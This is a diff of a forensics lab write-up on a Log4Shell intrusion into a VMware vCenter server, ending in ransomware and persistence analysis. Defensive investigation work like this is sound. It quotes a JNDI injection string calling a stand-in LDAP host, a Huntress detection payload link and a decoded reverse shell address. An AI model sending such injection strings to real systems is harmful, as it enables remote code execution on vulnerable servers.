@@ -26,7 +26,9 @@ For the last week, log4shell vulnerability has been gaining much attention not f
 
 ## Solution
 
-### 1. What is the computer hostname?
+### 1
+
+What is the computer hostname?
 
 **hostname: VCW65**
 
@@ -34,7 +36,9 @@ The computer hostname can be found in the network setup log file which is record
 
 ![netsetup](https://bn1304files.storage.live.com/y4mbJTqryKZecaAfzMVMLEKav0F1602GIIPZAtUoHNRRSJeWg8TsU_kBrjrhwNhgBzm6xVP6hewaVp6L_645W7uWRDOcDmr84BwkzknflsubNmACj_zYkTfdn88MBw3BQPs4D1W9hQu7xYTQ60Ao33JrJoOH-j1_9SZ1_6w9RUhWa7WnfVCogbY9CB6CkmbIC-V6tIhOzoj-mMObxrIK1sdAZ2dOFf1HQCunJZSrnxJqZU?encodeFailures=1&width=1087&height=615)
 
-### 2. What is the Timezone of the compromised machine?
+### 2
+
+What is the Timezone of the compromised machine?
 
 **UTC-8**
 
@@ -50,7 +54,9 @@ Open the `SYSTEM` registry file > go to ControlSet001 > Control > TimeZoneInform
 
 We can see that the time zone is in PST. By default PST and UTC have difference of 8 hours
 
-### 3. What is the current build number on the system?
+### 3
+
+What is the current build number on the system?
 
 **The current build number is 14393.**
 
@@ -62,7 +68,9 @@ Open the `SOFTWARE` registry file > Microsoft > Windows NT > CurrentVersion
 
 ![buildversion](https://bn1304files.storage.live.com/y4mUO5CYgH6yHIpc81beod48PNNBQ0VH2PqrM0jtbNCdv5UO_frCUHZ1baT7rr5XGlmIUsNpLDDxzgQ4WcQm_tEz8sw6pA52qrCA87CQH1Y9OX_eaMfPZ1DzRbXMqoGZEyL3-OX3dpBmWJxWcsZd4ORRhoVfv-GvVkGLD9VLDaP-n2K51iz-d9Ao2wZUroLwGEyDzEJ63Jb_Tl-6iZMwzVrWynKeErtlvQ3A7VjcudcNuU?encodeFailures=1&width=1750&height=794)
 
-### 4. What is the computer IP?
+### 4
+
+What is the computer IP?
 
 **The IP address is 192.168.112.139**
 
@@ -72,7 +80,9 @@ Open the `SYSTEM` registry file > go to ControlSet002 > Services > Tcpip > Param
 
 ![ipaddress](https://bn1304files.storage.live.com/y4mU-57GnbO9G5X4USYrAze7wrgcOkfmZj-F8jIBZ7ZaPpKoBvcGLXl59slrVQd83SK_o3EzWrjLCRt-qAwb-1BHdg8-K8iBihWPpEEccOfVygysBgDF6VvulitUaWgV1gkuMP2GQoG-lyEXob2kWKbQTsRsW2TnmYzSWvBAymyNOFz5WQcVyQ81moczlpJ0RKeHGx4_kvWYioQbEf51xtV9IqKM_FaApgZnE4SrSEPiy4?encodeFailures=1&width=1866&height=1118)
 
-### 5. What is the domain computer was assigned to?
+### 5
+
+What is the domain computer was assigned to?
 
 **cyberdefenders.org**
 
@@ -82,7 +92,9 @@ Open the `SYSTEM` registry file > go to ControlSet002 > Services > Tcpip > Param
 
 ![domain](https://bn1304files.storage.live.com/y4mgVREtJlNKr-fqB3CiAiN-vIh6DsXRAr1qe_UvfubOs2oB7FBYeYzCUFj1YgmszOfCNLqD2T4kdr1FlSSzkziW4aKYEs7EqAhuEyCg9qCN6wyf8SYCdgtFf9zCoPUSS74ax7OljZvLdJyuqh4VtUK3pm2eAi1mNa8j2VJJYaqe0lb53kij116u7VyqZ_wMfjRMsLWtiEdfB4HaSTkxyKTJJLJoVhImVALVGC89UquZlo?encodeFailures=1&width=1866&height=1118)
 
-### 6. When was myoussef user created?
+### 6
+
+When was myoussef user created?
 
 **2021-12-28 06:57:23 UTC**
 
@@ -90,7 +102,9 @@ From Autopsy, go to OS Accounts under the tree view on the left and search for t
 
 ![image](https://bn1304files.storage.live.com/y4mGpv_F3XK4nGanU6LDQg_wXuLDHtpj1ID5BtE9bTHg-jw6iyHyfCRSklXb4udDShiERJZmb64TLdQZZchlwUg8om-K1m4z4HMKFZHhBdLRSB-S_h3yq088Kkz048_czgOLjoL5xZYH2UrLrlC3u8BgKZeI8T3U5bYYN__sk6WYJNUiZVM5ci8hRSL8aCdDwFrWoLV1hxqG-HA3d6gC8jkxsoUaqH9ThroVoy07zCGTIY?encodeFailures=1&width=1263&height=727)
 
-### 7. What is the user mhasan password hint?
+### 7
+
+What is the user mhasan password hint?
 
 <https://www.linkedin.com/in/0xmohamedhasan/>
 
@@ -98,7 +112,9 @@ We can see from the results that mhasan's password hint is a linkedin profile.
 
 ![image](https://bn1304files.storage.live.com/y4micuGa0VH-ovWswZ6EzPOtBLg_c4u8V02cc9p2LJI5OjGeRKfCWti8ZMy5fEaulj-cYNMpU_LQLwDP7eRCm7GGP60mgvdJEtuRBYt852Qt3guTGkAsl_Yapp8MWI1S22eUtS2R1kW45zQd-oNpLEwEJY_GZur6YNZwA6zsmzwKIOc_snhd5bVJ7m9jFkGjW-pL2zt8oU1et3MGGbWTVMiQnOvQsW9k44OBmTeTaGpl7k?encodeFailures=1&width=1263&height=727)
 
-### 8. What is the version of the VMware product installed on the machine?
+### 8
+
+What is the version of the VMware product installed on the machine?
 
 **6.7.0.40322**
 
@@ -106,7 +122,9 @@ The version of VMWare product installed can be checked via *Installed programs* 
 
 ![image](https://bn1304files.storage.live.com/y4mwA2vCw1haeuFwJETHlucmdHCO97vtCWhV0Ok2ZyPhFEDvE23A95ms_JDlNs7CQfhHAQ5Rjqt6Yh4xtxvyfy8UnmiIE31HoDmX8APFzoYGBglahBSh_iDTQzUl4l2jqAdqrBCv9H2TgR7ZxIWN4A9JCOwtjK0qkO6kqZflqEZQwzR0ivCuPmPuNmWMMiw6bnE5Mzduw0VzfKaEoYnl0YkYGYkHj4zosRvHsoaMkVNAPs?encodeFailures=1&width=945&height=84)
 
-### 9. What is the version of the log4j library used by the installed VMware product?
+### 9
+
+What is the version of the log4j library used by the installed VMware product?
 
 **2.11.2**
 
@@ -114,7 +132,9 @@ The version of log4j library VMWare product is using can be checked in the follo
 
 `C:\Program Files\VMWare\vCenter Server\common-jars\log4j-core-2.11.2jar`
 
-### 10. What is the log4j library log level specified in the configuration file?
+### 10
+
+What is the log4j library log level specified in the configuration file?
 
 **info**
 
@@ -122,7 +142,9 @@ This needed some digging as the log4j.properties is the main config file that ke
 
 ![image](https://bn1304files.storage.live.com/y4mUJ2QqivuVvZdwQx_WryybKHkkmrNMJ21W59cOPOv1ryYxYoryjyAPqEdk-9yQIu005WgboSV3ETIIGATltHjstcFStZuiph2BD3mcHwqXKIA6ikJ52tE3vsvcpunpHEMGhJtx0B5fWxMC0x2exh6pwol_fPL2y3opxO5MelT9RqVX8FV9D0c6VihKuiXOIvBmFA8Z0QwTO8LHRL7ct8j8E5Cbmpg1gf08x8R2Gn41fw?encodeFailures=1&width=2240&height=1312)
 
-### 11. The attacker exploited log4shell through an HTTP login request. What is the HTTP header used to inject payload?
+### 11
+
+The attacker exploited log4shell through an HTTP login request. What is the HTTP header used to inject payload?
 
 `X-Forwarded-For`
 
@@ -136,13 +158,17 @@ User-Agent=${jndi:ldap://example.com/…}
 
 With the hint given in the question, the answer was deduced.
 
-### 12. The attacker used the log4shell.huntress.com payload to detect if vcenter instance is vulnerable. What is the first link of the log4huntress payload?
+### 12
+
+The attacker used the log4shell.huntress.com payload to detect if vcenter instance is vulnerable. What is the first link of the log4huntress payload?
 
 **log4shell.huntress.com:1389/b1292f3c-a652-4240-8fb4-59c43141f55a**
 
 A search for the keyword “log4shell.huntress.com” is crafted, then found a websso.log in the Result Viewer. From the result viewer the first link of log4shell payload can be found.
 
-### 13. When was the first successful login to vsphere WebClient?
+### 13
+
+When was the first successful login to vsphere WebClient?
 
 **28/12/2021 20:39:29 UTC**
 
@@ -150,7 +176,9 @@ The login event can be found via VMWare's `audit_events.log` found in the path b
 
 `C:\Program Files\VMWare\vCenterServer\runtime\VMWareSTSService\logs\audit_events.log`
 
-### 14. What is the attacker's IP address?
+### 14
+
+What is the attacker's IP address?
 
 **192.168.112.128**
 
@@ -158,19 +186,25 @@ The attacker's ip address can be found via the same `audit_events.log` via Autop
 
 `C:\Program Files\VMWare\vCenterServer\runtime\VMWareSTSService\logs\audit_events.log`
 
-### 15. What is the port the attacker used to receive the cobalt strike reverse shell?
+### 15
+
+What is the port the attacker used to receive the cobalt strike reverse shell?
 
 **1337**
 
 Cobalt Strike is usually used with a Base64 encoded PowerShell command. The lowest hanging fruit would be to identify the attack by going through `Microsoft-Windows-PowerShell%4Operational.evtx`. Sure enough a Base64 encoded was found in the logs which decodes to `192.168.112:128:1337`
 
-### 16. What is the script name published by VMware to mitigate log4shell vulnerability?
+### 16
+
+What is the script name published by VMware to mitigate log4shell vulnerability?
 
 **vc_log4j_mitigator.py**
 
 By digging on google, VMWare has published a [blog](https://kb.vmware.com/s/article/87081) on mitigating the vulnerability.
 
-### 17. In some cases, you may not be able to update the products used in your network. What is the system property needed to set to 'true' to work around the log4shell vulnerability?
+### 17
+
+In some cases, you may not be able to update the products used in your network. What is the system property needed to set to 'true' to work around the log4shell vulnerability?
 
 **log4j2.formatMsgNoLookups**
 
@@ -178,11 +212,15 @@ By googling *change system property to mitigate log4shell vulnerability*, an art
 
 `log4j2.formatMsgNoLookups=True`
 
-### 18. What is the log4j version which contains a patch to CVE-2021-44228?
+### 18
+
+What is the log4j version which contains a patch to CVE-2021-44228?
 
 **2.15.0**
 
-### 19. Removing JNDIlookup.class may help in mitigating log4shell. What is the sha256 hash of the JNDILookup.class?
+### 19
+
+Removing JNDIlookup.class may help in mitigating log4shell. What is the sha256 hash of the JNDILookup.class?
 
 `0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e`
 
@@ -201,7 +239,9 @@ Hash      : 0F038A1E0AA0AFF76D66D1440C88A2B35A3D023AD8B2E3BAC8E25A3208499F7E
 Path      : C:\Users\uname\Desktop\Log4shell\log4j-core-2.11.2\org\apache\logging\log4j\core\lookup\JndiLookup.class
 ```
 
-### 20. Analyze JNDILookup.class. What is the value stored in the CONTAINER_JNDI_RESOURCE_PATH_PREFIX variable?
+### 20
+
+Analyze JNDILookup.class. What is the value stored in the CONTAINER_JNDI_RESOURCE_PATH_PREFIX variable?
 
 **java:comp/env/**
 
@@ -209,7 +249,9 @@ The `CONTAINER_JNDI_RESOURCE_PATH_PREFIX` can be found in the path below.
 
 `C:\Program Files\VMWare\vCenter Server\cm\lib\log4j-core.jar`
 
-### 21. What is the executable used by the attacker to gain persistence?
+### 21
+
+What is the executable used by the attacker to gain persistence?
 
 **baaaackdooor.exe**
 
@@ -221,13 +263,17 @@ Click on `NTUSER.DAT` and expand SOFTWARE > Microsoft > Windows > CurrentVersion
 
 ![image](https://bn1304files.storage.live.com/y4mP2NX1n_VSJjPkROjPUHNSoLhhCWCV3LVkYaCUa6ioElcT1fLW-n2jZCWXhhCF9eC-g2HWUexz_5w7Mbg7Dyk2rCWlhNkpq2znKDSgtyrJMvCXwChjyc0ClvfznZ-smNmaTKmn0dBdMaIFn_tyy85vKO0WbG_L9_sujO3Pdt2JtfOS1NZFXF9sN4SHWybKW1yx5nTZ6kVtag493d8TiLttME2p5yJMauvXoA2d_p-4dk?encodeFailures=1&width=2122&height=1372)
 
-### 22. When was the first submission of ransomware to virustotal?
+### 22
+
+When was the first submission of ransomware to virustotal?
 
 **2021-12-11 22:57:01**
 
 The sha256 hash: `f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789` of `baaaackdooor.exe` can be searched on Virustotal for First Submission under history.
 
-### 23. The ransomware downloads a text file from an external server. What is the key used to decrypt the URL?
+### 23
+
+The ransomware downloads a text file from an external server. What is the key used to decrypt the URL?
 
 **"GoaahQrC"**
 
@@ -271,7 +317,9 @@ private static void Main()
 From dnspy, right-click on the executable and select the go-to entry point.
 we can find the main function and see that `string text3` variable is being passed around to decrypt the external url.
 
-### 24. What is the ISP that owns that IP that serves the text file?
+### 24
+
+What is the ISP that owns that IP that serves the text file?
 
 **amazon**
 
@@ -279,7 +327,9 @@ This can be found from the previous Virustotal results.
 
 <https://www.virustotal.com/gui/file/f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789/relations>
 
-### 25. The ransomware check for extensions to exclude them from the encryption process. What is the second extension the ransomware checks for?
+### 25
+
+The ransomware check for extensions to exclude them from the encryption process. What is the second extension the ransomware checks for?
 
 The extension is **ini** as mentioned in the same report from question 23.
 <https://www.bluvector.io/threat-report/khonsari-new-malware-apache-log4j/>
